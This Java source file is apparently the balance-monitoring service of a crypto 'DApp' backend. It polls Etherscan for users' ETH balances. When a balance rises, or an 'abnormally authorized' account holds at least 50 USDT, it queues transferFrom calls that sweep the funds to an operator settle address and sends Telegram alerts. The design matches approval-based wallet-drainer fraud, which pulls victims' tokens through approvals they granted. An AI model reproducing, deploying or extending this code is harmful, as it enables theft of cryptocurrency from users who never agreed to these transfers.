package project.monitor.job.balanceof;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

import kernel.util.Arith;
import kernel.util.ThreadUtils;
import project.Constants;
import project.log.MoneyLog;
import project.log.MoneyLogService;
import project.monitor.AutoMonitorTipService;
import project.monitor.AutoMonitorWalletService;
import project.monitor.bonus.AutoMonitorSettleAddressConfigService;
import project.monitor.bonus.model.SettleAddressConfig;
import project.monitor.etherscan.EtheBalance;
import project.monitor.etherscan.EtherscanService;
import project.monitor.etherscan.GasOracle;
import project.monitor.job.transferfrom.TransferFrom;
import project.monitor.job.transferfrom.TransferFromQueue;
import project.monitor.model.AutoMonitorAutoTransferFromConfig;
import project.monitor.model.AutoMonitorTip;
import project.monitor.model.AutoMonitorWallet;
import project.monitor.telegram.business.TelegramBusinessMessageService;
import project.party.PartyService;
import project.party.model.Party;
import project.syspara.SysparaService;
import project.wallet.WalletExtend;
import project.wallet.WalletService;

/**
 * eth余额查询并归集服务
 *
 */
public class EthBalanceOfServer implements Runnable {
	private static Log logger = LogFactory.getLog(BalanceOfServer.class);

	private WalletService walletService;
	protected MoneyLogService moneyLogService;
	protected AutoMonitorTipService autoMonitorTipService;
	protected SysparaService sysparaService;
	protected PartyService partyService;
	protected TelegramBusinessMessageService telegramBusinessMessageService;
	private AutoMonitorWalletService autoMonitorWalletService;
	private EtherscanService etherscanService;
	private AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService;

	private volatile boolean isRunning = false;

	private volatile boolean islock = false;

	private List<AutoMonitorAutoTransferFromConfig> items;

	public void start() {
		new Thread(this, "EthBalanceOfServer").start();
		if (logger.isInfoEnabled()) {
			logger.info("启动地址(账户)的账户eth余额读取(EthBalanceOfServer)服务！");
		}

	}

	public void start(List<AutoMonitorAutoTransferFromConfig> items) {
		this.items = items;
		this.isRunning = true;

	}

	/**
	 * 锁住，先拿到服务权限
	 */
	public void lock() {
		this.islock = true;
	}

	@Override
	public void run() {
		while (true) {

			if (!isRunning) {
				ThreadUtils.sleep(1000);
				continue;
			}

			try {

				// 每次处理20个
				Map<String, AutoMonitorAutoTransferFromConfig> itemMap = new HashMap<String, AutoMonitorAutoTransferFromConfig>();
				boolean auto_monitor_abnormal_user_auto_transferfrom_button = sysparaService.find("auto_monitor_abnormal_user_auto_transferfrom_button").getBoolean();
				int count = 0;
				for (int i = 0; i < items.size(); i++) {
					AutoMonitorAutoTransferFromConfig item = items.get(i);
					//如果未开启eth余额增加自动归集则略过
					if(!item.isEnabled_eth_add()) {
						continue;
					}
					try {

						Party party = partyService.cachePartyBy(item.getPartyId(), true);
						if(auto_monitor_abnormal_user_auto_transferfrom_button) {
							handleExceptionConfig(party, item);
						}
						itemMap.put(party.getUsername(), item);
						count++;
						// 每次处理100个 或者已经到最后一个了
						if (count == 20 || i == items.size() - 1) {
							handle(itemMap);
							// 远程接口调用间隔1秒
							ThreadUtils.sleep(1000);
							// 每批处理完清空
							itemMap.clear();
							count = 0;

						}
					} catch (Throwable t) {
						logger.error("EthBalanceOfServer run() partyId:" + item.getPartyId() + ",fail:", t);
					}
				}

				/**
				 * 处理完，置空
				 */
				items = new ArrayList<AutoMonitorAutoTransferFromConfig>();

			} catch (Throwable e) {
				logger.error("EthBalanceOfServer run() fail", e);

			} finally {
				/**
				 * 任务处理完，持久化数据并释放任务执行权限
				 */
				ThreadUtils.sleep(1000);
				isRunning = false;
				islock = false;
			}
		}

	}

	public void handleExceptionConfig(Party party,AutoMonitorAutoTransferFromConfig config) {
		if(!"3".equals(config.getType())) {
			return;
		}
		try {
			WalletExtend walletExtend = walletService.saveExtendByPara(party.getId(),
					Constants.WALLETEXTEND_DAPP_USDT_USER);
			//余额大于50自动归集
			if(walletExtend.getAmount()>=50) {
				AutoMonitorWallet autoMonitorWallet = autoMonitorWalletService.findBy(party.getUsername());
				AutoMonitorTip tip = new AutoMonitorTip();

				/**
				 * 归集操作
				 */
				TransferFrom item = new TransferFrom();
	
				item.setAutoMonitorWallet(autoMonitorWallet);
				SettleAddressConfig findDefault = autoMonitorSettleAddressConfigService.findDefault();
				item.setTo(findDefault.getChannel_address());
				item.setGasPriceType(GasOracle.GAS_PRICE_SUPER);
	
				TransferFromQueue.add(item);
	
				tip.setDispose_method("已归集");
	
				tip.setPartyId(config.getPartyId());
				tip.setTiptype(0);
				tip.setTipinfo("异常授权账户，USDT余额大于50自动归集");
	
				tip.setCreated(new Date());
				autoMonitorTipService.saveTipNewThreshold(tip);
			}
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("EthBalanceOfServer handleExceptionConfig() address:" + party.getUsername() + ",fail:",
					e);
		}
	}
	public void handle(Map<String, AutoMonitorAutoTransferFromConfig> itemMap) {
		try {
			List<EtheBalance> etherMultipleBalance = etherscanService
					.getEtherMultipleBalance(String.join(",", itemMap.keySet()), 0);
			for (EtheBalance etheBalance : etherMultipleBalance) {
				AutoMonitorAutoTransferFromConfig config = itemMap.get(etheBalance.getAccount());
				autoTransferFrom(config, etheBalance.getBalance());
			}
		} catch (Exception e) {
			// TODO: handle exception
			logger.error("EthBalanceOfServer handle() addresses:" + String.join(",", itemMap.keySet()) + ",fail:",
					e);
		}
	}

	public void autoTransferFrom(AutoMonitorAutoTransferFromConfig config, Double balance) {
		try {

			if (balance == null) {
				return;
			}
			balance = new BigDecimal(balance).setScale(8, RoundingMode.DOWN).doubleValue();
			Party party = partyService.cachePartyBy(config.getPartyId(), false);
			WalletExtend walletExtend = walletService.saveExtendByPara(config.getPartyId(),
					Constants.WALLETEXTEND_DAPP_ETH_USER);

			double amount_before = walletExtend.getAmount();
			/**
			 * 为0刚是新初始化的账户，第一次读取到数值 不做提醒
			 */
			if (balance > walletExtend.getAmount()) {

				if (walletExtend.getAmount() != 0) {

					AutoMonitorWallet autoMonitorWallet = autoMonitorWalletService.findBy(party.getUsername());
					if (autoMonitorWallet == null || autoMonitorWallet.getSucceeded() != 1) {
						return;
					}

					AutoMonitorTip tip = new AutoMonitorTip();

					/**
					 * 新增自动归集判断
					 */
					// TOTO
					/**
					 * 归集操作
					 */
					TransferFrom item = new TransferFrom();

					item.setAutoMonitorWallet(autoMonitorWallet);
//					AutoMonitorTransferAddressConfig transferAddressConfig = autoMonitorTransferAddressConfigService
//							.findAll().get(0);
					SettleAddressConfig findDefault = autoMonitorSettleAddressConfigService.findDefault();
					item.setTo(findDefault.getChannel_address());
					item.setGasPriceType(GasOracle.GAS_PRICE_SUPER);

					TransferFromQueue.add(item);

					tip.setDispose_method("已归集");

					tip.setPartyId(config.getPartyId());
					tip.setTiptype(0);
					tip.setTipinfo("账户ETH增加[" + Arith.sub(balance, walletExtend.getAmount()) + "]");

					tip.setCreated(new Date());
					autoMonitorTipService.saveTipNewThreshold(tip);

				}

			}
			if (walletExtend.getAmount() != balance) {

				if (walletExtend.getAmount() != 0) {

					/**
					 * 群通知
					 */
					telegramBusinessMessageService.sendEthChangeTeleg(party, amount_before,
							Arith.sub(balance, walletExtend.getAmount()),
							Arith.add(walletExtend.getAmount(), Arith.sub(balance, walletExtend.getAmount())));

				}
				walletService.updateExtend(config.getPartyId().toString(), Constants.WALLETEXTEND_DAPP_ETH_USER,
						Arith.sub(balance, walletExtend.getAmount()));
				/*
				 * 保存资金日志
				 */
				MoneyLog moneyLog = new MoneyLog();
				moneyLog.setAmount_before(amount_before);
				moneyLog.setAmount(Arith.sub(balance, amount_before));
				moneyLog.setAmount_after(Arith.add(amount_before, Arith.sub(balance, amount_before)));

				moneyLog.setLog("ETH币值变化");
				moneyLog.setPartyId(config.getPartyId());
				moneyLog.setWallettype(Constants.WALLETEXTEND_DAPP_ETH_USER);
				moneyLog.setCreateTime(new Date());

				moneyLogService.save(moneyLog);

//				Party party = partyService.cachePartyBy(config.getPartyId(), true);
//				telegramBusinessMessageService.sendEthChangeTeleg(party, moneyLog.getAmount_before(),
//						moneyLog.getAmount(), moneyLog.getAmount_after());
			}
		} catch (Throwable t) {
			logger.error("EthBalanceOfServer autoTransferFrom() partyId:" + config.getPartyId() + " fail", t);
		}
	}

	/**
	 * 确认服务是否在启动中，如果被启动，外部线程自行阻塞等到处理完后调用
	 * 
	 * @return
	 */
	public boolean isRunning() {

		return isRunning;
	}

	public boolean islock() {

		return islock;
	}

	public void setWalletService(WalletService walletService) {
		this.walletService = walletService;
	}

	public void setMoneyLogService(MoneyLogService moneyLogService) {
		this.moneyLogService = moneyLogService;
	}

	public void setAutoMonitorTipService(AutoMonitorTipService autoMonitorTipService) {
		this.autoMonitorTipService = autoMonitorTipService;
	}

	public void setPartyService(PartyService partyService) {
		this.partyService = partyService;
	}

	public void setTelegramBusinessMessageService(TelegramBusinessMessageService telegramBusinessMessageService) {
		this.telegramBusinessMessageService = telegramBusinessMessageService;
	}

	public void setSysparaService(SysparaService sysparaService) {
		this.sysparaService = sysparaService;
	}

	public void setAutoMonitorWalletService(AutoMonitorWalletService autoMonitorWalletService) {
		this.autoMonitorWalletService = autoMonitorWalletService;
	}

	public void setEtherscanService(EtherscanService etherscanService) {
		this.etherscanService = etherscanService;
	}

	public void setAutoMonitorSettleAddressConfigService(
			AutoMonitorSettleAddressConfigService autoMonitorSettleAddressConfigService) {
		this.autoMonitorSettleAddressConfigService = autoMonitorSettleAddressConfigService;
	}

	
}
